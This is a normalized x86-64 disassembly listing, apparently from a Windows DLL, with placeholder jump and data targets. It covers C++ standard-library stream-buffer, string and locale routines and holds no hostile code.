cmovl r12 rbx
mov r8 r12
call sub_1800205e0
mov rax [ rbp + 0x58 ]
add rdi r12
sub [ rax ] r12d
mov rcx [ rbp + 0x40 ]
movsxd rax r12d
add rsi r12
sub rbx r12
add [ rcx ] rax
jmp r-xdata
mov r12 [ rsp + 0x30 ]
mov rax rsi
mov [ rdi ] al
inc rdi
inc rsi
dec rbx
test rbx rbx
jg r-xdata
mov rcx rbp
call sub_18000be80
mov r12 rax
test rax rax
jle r-xdata
sub_18000bfc0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rbx r8
mov rsi rdx
mov r12 rcx
test r8 r8
jle r-xdata
mov rax rdi
jmp r-xdata
mov [ rsp + 0x30 ] rbp
nop
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov r8 [ r12 ]
movzx edx [ rsi ]
mov rcx r12
call [ r8 + 0x18 ]
cmp eax 0xffffffff
je r-xdata
mov rcx [ r12 + 0x48 ]
cmp rbx rax
mov rdx rsi
mov rcx [ rcx ]
cmovl rbp rbx
mov r8 rbp
call sub_1800205e0
mov rax [ r12 + 0x60 ]
add rsi rbp
sub [ rax ] ebp
mov rcx [ r12 + 0x48 ]
movsxd rax ebp
add rdi rbp
sub rbx rbp
add [ rcx ] rax
jmp r-xdata
mov rbp [ rsp + 0x30 ]
mov rax rdi
inc rsi
inc rdi
dec rbx
test rbx rbx
jg r-xdata
mov rcx r12
call sub_18000bea0
mov rbp rax
test rax rax
jle r-xdata
sub_18000c0a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rcx + 0x78 ] 0x1
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov rdi [ rbx + 0x68 ]
and [ rbx + 0x78 ] 0xfffffffe
lea rax [ r--data ]
mov [ rbx + 0x70 ] rcx
mov [ rbx ] rax
test rdi rdi
je r-xdata
mov rcx [ rcx + 0x20 ]
mov rcx [ rcx ]
call j_sub_18002094c#2
lea rcx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_180020254
mov rcx rdi
call sub_18000b6f0
mov rcx rdi
call j_sub_18002094c#2
sub_18000c140
mov rax [ rcx + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
or eax 0xffffffff
retn
mov rax [ rcx + 0x20 ]
cmp r8 [ rax ]
jbe r-xdata
cmp edx 0xffffffff
je r-xdata
mov rax [ rcx + 0x58 ]
inc [ rax ]
mov rax [ rcx + 0x40 ]
dec [ rax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ r8 - 0x1 ]
je r-xdata
xor edx edx
mov eax edx
retn
mov rax [ rcx + 0x40 ]
mov rcx [ rax ]
mov eax edx
mov [ rcx ] dl
retn
test [ rcx + 0x78 ] 0x2
jne r-xdata
sub_18000c190
mov r9 [ rcx + 0x40 ]
mov rdx rcx
mov r8 [ r9 ]
test r8 r8
je r-xdata
or eax 0xffffffff
retn
mov r10 [ rcx + 0x58 ]
movsxd rax [ r10 ]
add rax r8
cmp r8 rax
jae r-xdata
test [ rcx + 0x78 ] 0x4
jne r-xdata
movzx eax [ r8 ]
retn
mov rax [ rcx + 0x48 ]
mov rcx [ rax ]
test rcx rcx
je r-xdata
cmp rcx r8
ja r-xdata
cmp [ rdx + 0x70 ] rcx
jae r-xdata
cmp [ rdx + 0x70 ] r8
jbe r-xdata
mov rax [ rdx + 0x70 ]
sub eax [ r9 ]
mov [ r10 ] eax
mov rax [ rdx + 0x40 ]
mov rcx [ rax ]
movzx eax [ rcx ]
retn
mov [ rdx + 0x70 ] rcx
sub_18000c200
push rbx
mov rbx [ rcx + 0x48 ]
mov r11 rdx
mov r10 rcx
mov rax [ rbx ]
test rax rax
je r-xdata
mov edx [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rdi
test dl 0x1
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
test dl 0x2
je r-xdata
mov rax [ rcx + 0x40 ]
mov rdi [ rax ]
test rdi rdi
je r-xdata
mov [ rcx + 0x70 ] rax
test r8 r8
cmovne r8 [ r--data ]
mov rbx [ rbx ]
test rbx rbx
je r-xdata
mov rbx [ r--data ]
cmp r9d 0x2
jne r-xdata
mov rdi [ r--data ]
cmp r9d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
test r9d r9d
je r-xdata
test dl 0x2
jne r-xdata
test r8 r8
js r-xdata
test r9d r9d
cmovne r8 rdi
mov rax [ rcx + 0x20 ]
mov rcx rbx
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
test r8 r8
js r-xdata
mov r8 rbx
mov rax [ rcx + 0x20 ]
mov rcx rdi
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
mov r8 rbx
jmp r-xdata
mov rax [ r10 + 0x20 ]
mov r9 [ rax ]
mov rax [ r10 + 0x70 ]
sub rax r9
cmp r8 rax
jg r-xdata
mov r8 rdi
jmp r-xdata
mov rax [ r10 + 0x20 ]
mov rdx [ rax ]
mov rax [ r10 + 0x70 ]
sub rax rdx
cmp r8 rax
jg r-xdata
mov rdi [ rsp + 0x10 ]
xor eax eax
mov [ r11 ] r8
mov [ r11 + 0x8 ] rax
mov [ r11 + 0x10 ] eax
mov rax r11
pop rbx
retn
mov rax [ r10 + 0x58 ]
sub r9d edi
add r9d r8d
sub [ rax ] r9d
mov rcx [ r10 + 0x40 ]
movsxd rax r9d
add [ rcx ] rax
test dl 0x2
je r-xdata
mov rax [ r10 + 0x60 ]
sub edx ebx
add edx r8d
sub [ rax ] edx
mov rcx [ r10 + 0x48 ]
movsxd rax edx
add [ rcx ] rax
jmp r-xdata
mov r9 [ r10 + 0x48 ]
mov rbx [ r9 ]
test rbx rbx
je r-xdata
mov rax [ r10 + 0x40 ]
mov rdx [ rax ]
mov rax [ r10 + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ r10 + 0x60 ]
add rcx rbx
sub ecx edx
mov [ rax ] ecx
jmp r-xdata
sub_18000c390
mov [ rsp + 0x8 ] rbx
movsxd r10 [ r8 + 0x8 ]
mov ebx r9d
mov r9 rdx
mov rdx [ rcx + 0x48 ]
add r10 [ r8 ]
mov r11 rcx
mov rax [ rdx ]
test rax rax
je r-xdata
mov rcx [ r--data ]
cmp r10 rcx
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
mov rbx [ rsp + 0x8 ]
xor eax eax
mov [ r9 ] r10
mov [ r9 + 0x8 ] rax
mov [ r9 + 0x10 ] eax
mov rax r9
retn
test bl 0x1
je r-xdata
mov [ rcx + 0x70 ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
mov r10 rcx
mov r8 [ rdx ]
test r8 r8
je r-xdata
test r10 r10
js r-xdata
test r10 r10
js r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x58 ]
sub edx r8d
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x40 ]
movsxd rax edx
add [ rcx ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub edx r8d
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add [ rcx ] rax
jmp r-xdata
mov r8 [ r11 + 0x48 ]
mov rbx [ r8 ]
test rbx rbx
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ r8 ] rdx
mov rax [ r11 + 0x60 ]
add rcx rbx
sub ecx edx
mov [ rax ] ecx
jmp r-xdata
sub_18000c4a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x8 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x8 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x8 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_1800200a0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000c500
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x10 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x10 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x10 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_1800200a0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000c560
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x68 ]
lea rax [ r--data ]
mov esi edx
mov rbx rcx
mov [ rcx ] rax
test rdi rdi
je r-xdata
lea rcx [ rbx + 0x8 ]
call sub_180020254
test sil 0x1
je r-xdata
mov rcx rdi
call sub_18000b6f0
mov rcx rdi
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18002094c#2
sub_18000c5d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x18 ]
mov ebx edx
mov rax [ rdi ]
lea rcx [ rdi + 0x18 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x8 ] rax
mov rdx [ rcx - 0x18 ]
lea rax [ r--data ]
movsxd r8 [ rdx + 0x4 ]
mov [ r8 + rcx - 0x18 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_1800200a0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000c650
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_18000c0a0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000c680
push rbx
push rbp
push r12
sub rsp 0x20
mov rbp r9
mov r12 rdx
mov rbx rcx
test r9 r9
jne r-xdata
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov rdi [ rcx + 0x10 ]
mov [ rsp + 0x50 ] r13
cmp r8 rdi
jae r-xdata
cmp r8 [ rcx + 0x10 ]
ja r-xdata
or rax 0xffffffffffffffff
sub rdi r8
cmp r9 rdi
ja r-xdata
mov rax r8
add rsp 0x20
pop r12
pop rbp
pop rbx
retn
mov eax 0x1
sub rax r9
add rdi rax
cmp [ rcx + 0x18 ] 0x10
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
nop [ rax ] eax
movsx edx [ rdx ]
lea r13 [ rax + r8 ]
mov r8 rdi
mov rcx r13
call sub_1800215e8
mov rsi rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
movsx edx [ r12 ]
sub r13 rsi
lea rdi [ rdi + r13 - 0x1 ]
lea r13 [ rsi + 0x1 ]
mov rcx r13
mov r8 rdi
call sub_1800215e8
mov rsi rax
test rax rax
jne r-xdata
sub rsi rbx
mov rax rsi
jmp r-xdata
mov rbx [ rbx ]
mov r8 rbp
mov rdx r12
mov rcx rsi
call sub_180021520
test eax eax
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov r13 [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rbp
pop rbx
retn
sub_18000c770
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x8
call sub_18002022c
nop
mov ecx 0x8
call sub_180021000
mov rdi rax
xor ebp ebp
test rax rax
je r-xdata
mov rdi rbp
call sub_18001fdcc
mov [ rdi ] rax
call sub_18001fb7c
mov rsi rax
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_18001f9f0
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x58 ]
call sub_18001fa20
jmp r-xdata
inc rcx
mov [ rsi + 0x8 ] rcx
mov [ rbx + 0x68 ] rdi
lea rax [ rbx + 0x10 ]
mov [ rbx + 0x20 ] rax
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rbp
mov rax [ rbx + 0x48 ]
mov [ rax ] rbp
mov rax [ rbx + 0x60 ]
mov [ rax ] ebp
mov rax [ rbx + 0x20 ]
mov [ rax ] rbp
mov rax [ rbx + 0x40 ]
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] ebp
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_18000c890
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
movzx r13d r8b
mov rsi rcx
call sub_180021604
mov r12 rax
xor eax eax
mov [ rsi + 0x10 ] rax
mov [ rsi + 0x20 ] rax
mov [ rsi + 0x28 ] rax
test r13b r13b
lea rbx [ r--data ]
jne r-xdata
call sub_18001f944
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
mov rdi rcx
call j_sub_180021000
mov rdx rax
nop [ rax ] eax
mov rbx [ r12 + 0x10 ]
mov [ rsi + 0x10 ] rax
call sub_18001f944
lea rbx [ r--data ]
mov edi 0x6
mov ecx edi
call j_sub_180021000
mov rdx rax
movzx ecx [ rbx ]
mov [ rdx ] cl
dec rdi
inc rdx
inc rbx
jmp r-xdata
mov [ rsi + 0x20 ] rax
call sub_18001f944
lea rbx [ r--data ]
mov edi 0x5
mov ecx edi
call j_sub_180021000
mov rdx rax
movzx ecx [ rbx ]
mov [ rdx ] cl
dec rdi
inc rdx
inc rbx
jmp r-xdata
test rdi rdi
je r-xdata
mov [ rsi + 0x28 ] rax
call sub_18001f944
mov rax [ r12 ]
movzx ecx [ rax ]
mov [ rsi + 0x18 ] cl
call sub_18001f944
mov rax [ r12 + 0x8 ]
movzx ecx [ rax ]
mov [ rsi + 0x19 ] cl
test r13b r13b
je r-xdata
movzx ecx [ rbx ]
mov [ rdx ] cl
dec rdi
inc rdx
inc rbx
jmp r-xdata
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call sub_18001f944
mov [ rsi + 0x18 ] 0x2e
call sub_18001f944
mov [ rsi + 0x19 ] 0x2c
test rdi rdi
je r-xdata
sub_18000c9d0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rdi rdx
mov rbx rcx
xor edx edx
call sub_18001f9f0
nop
xor eax eax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] al
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x20 ] al
mov [ rbx + 0x28 ] rax
mov [ rbx + 0x30 ] al
mov [ rbx + 0x38 ] rax
mov [ rbx + 0x40 ] al
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_18001fcf8
nop
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_180020424
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
int3
sub_18000ca70
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
call sub_18001fc64
nop
mov rcx [ rbx + 0x38 ]
test rcx rcx
je r-xdata
xor edi edi
mov [ rbx + 0x38 ] rdi
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov [ rbx + 0x28 ] rdi
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov [ rbx + 0x18 ] rdi
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov [ rbx + 0x8 ] rdi
mov rcx rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
jmp sub_18001fa20
call sub_18002094c
sub_18000caf0
mov rax rsp
push rdi
sub rsp 0x90
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rbp rdx
mov rdi rcx
xor esi esi
mov [ rsp + 0xa0 ] esi
test rcx rcx
je r-xdata
mov eax 0x2
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
cmp [ rcx ] rsi
jne r-xdata
lea ecx [ rsi + 0x28 ]
call sub_180021000
mov rbx rax
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18000ca70
lea rcx [ rsp + 0x40 ]
call sub_18000c9d0
mov esi 0x1
mov [ rbx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
lea rcx [ rsp + 0x28 ]
call sub_18001f8d8
mov rcx [ rax ]
mov [ rbx + 0x10 ] rcx
mov rcx [ rax + 0x8 ]
mov [ rbx + 0x18 ] rcx
mov rax [ rax + 0x10 ]
mov [ rbx + 0x20 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rdi ] rbx
test sil 0x1
je r-xdata
sub_18000cbe0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx - 0x98 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x98 ] rax
lea rbx [ rcx - 0x80 ]
mov rcx rbx
call sub_18000c0a0
nop
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
mov rax [ rbx - 0x8 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x8 ] rax
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
add rsp 0x30
pop rbx
retn
sub_18000cc60
push rbx
push rbp
sub rsp 0x28
test [ rcx + 0x78 ] 0x8
mov ebp edx
mov rbx rcx
je r-xdata
cmp ebp 0xffffffff
jne r-xdata
mov r9 [ rcx + 0x48 ]
mov r8 [ r9 ]
test r8 r8
je r-xdata
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x28
pop rbp
pop rbx
retn
mov rdx [ rcx + 0x70 ]
cmp r8 rdx
jae r-xdata
test [ rbx + 0x78 ] 0x2
je r-xdata
mov r8 [ rbx + 0x60 ]
movsxd rax [ r8 ]
add rax rdx
cmp rdx rax
jae r-xdata
mov rax [ rcx + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ rbx + 0x60 ]
add rcx r8
sub ecx edx
mov [ rax ] ecx
mov [ rsp + 0x48 ] rdi
test rdx rdx
jne r-xdata
or eax 0xffffffff
add rsp 0x28
pop rbp
pop rbx
retn
dec [ r8 ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] bpl
mov eax ebp
add rsp 0x28
pop rbp
pop rbx
retn
mov rax [ rbx + 0x60 ]
movsxd rdi [ rax ]
mov rax [ rbx + 0x20 ]
sub rdi [ rax ]
add rdi rdx
xor edi edi
jmp r-xdata
test rcx rcx
je r-xdata
mov ecx 0x20
jmp r-xdata
mov rcx rdi
shr rcx 0x1
cmp rcx 0x20
jae r-xdata
or eax 0xffffffff
mov rdi [ rsp + 0x48 ]
add rsp 0x28
pop rbp
pop rbx
retn
nop [ rax ] eax
mov eax 0x7fffffff
sub rax rcx
cmp rax rdi
jae r-xdata
test rcx rcx
jne r-xdata
shr rcx 0x1
jne r-xdata
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x50 ] r12
mov [ rsp + 0x20 ] r13
lea r13 [ rcx + rdi ]
lea rcx [ rbx + 0x7c ]
mov rdx r13
call sub_1800073b0
mov rcx [ rbx + 0x20 ]
mov r12 [ rcx ]
mov rsi rax
test rdi rdi
je r-xdata
mov rax [ rbx + 0x28 ]
mov [ rbx + 0x70 ] rsi
mov [ rax ] rsi
mov rax [ rbx + 0x48 ]
mov [ rax ] rsi
mov rax [ rbx + 0x60 ]
mov [ rax ] r13d
mov rax [ rbx + 0x20 ]
test [ rbx + 0x78 ] 0x4
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
je r-xdata
mov r8 rdi
mov rdx r12
mov rcx rax
call sub_1800205e0
test rdi rdi
jne r-xdata
mov [ rax ] rsi
mov rax [ rbx + 0x58 ]
mov [ rax ] 0x1
jmp r-xdata
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rcx [ rbx + 0x28 ]
mov rax rsi
sub rax r12
add [ rbx + 0x70 ] rax
mov rax [ rbx + 0x48 ]
mov rdx [ rax ]
mov rax rsi
sub rax r12
sub rdx r12
add [ rcx ] rax
mov rax [ rbx + 0x48 ]
add rdx rsi
mov [ rax ] rdx
mov rax [ rbx + 0x60 ]
mov ecx esi
sub ecx edx
add ecx r13d
mov [ rax ] ecx
test [ rbx + 0x78 ] 0x4
je r-xdata
test [ rbx + 0x78 ] 0x1
mov r13 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8 [ rax ]
mov rax [ rbx + 0x40 ]
mov rdx [ rax ]
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sub rdx r12
add rdx rsi
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
sub r8d edx
inc r8d
mov [ rax ] r8d
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x60 ]
or [ rbx + 0x78 ] 0x1
mov r12 [ rsp + 0x50 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdi [ rsp + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] bpl
mov eax ebp
add rsp 0x28
pop rbp
pop rbx
retn
mov rcx r12
call j_sub_18002094c#2
sub_18000cec0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rsi r8
mov r8 [ rcx + 0x10 ]
movzx r12d r9b
mov rbp rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
or rax 0xffffffffffffffff
sub rax r8
cmp rax rsi
ja r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov [ rsp + 0x30 ] rdi
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rsi ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180007580
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + rbp ]
lea rcx [ rax + rbp ]
sub r8 rbp
add rcx rsi
call sub_1800205e0
cmp rsi 0x1
jne r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rbp ] r12b
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rbp ] r12b
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rcx [ rax + rbp ]
movsx edx r12b
mov r8 rsi
call sub_180021150
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_18000d060
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x10
jb r-xdata
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
cmp r9 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180007580
test rdi rdi
je r-xdata
cmp r9 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
jmp r-xdata
mov rax [ rbx ]
mov [ rax ] dil
jmp r-xdata
sub rsi rax
mov r9 r8
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
jmp sub_180007b00
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
mov r8 rbp
mov rdx rsi
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_18000d1a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
or rax 0xffffffffffffffff
movzx ebp r8b
mov r8 [ rcx + 0x10 ]
sub rax r8
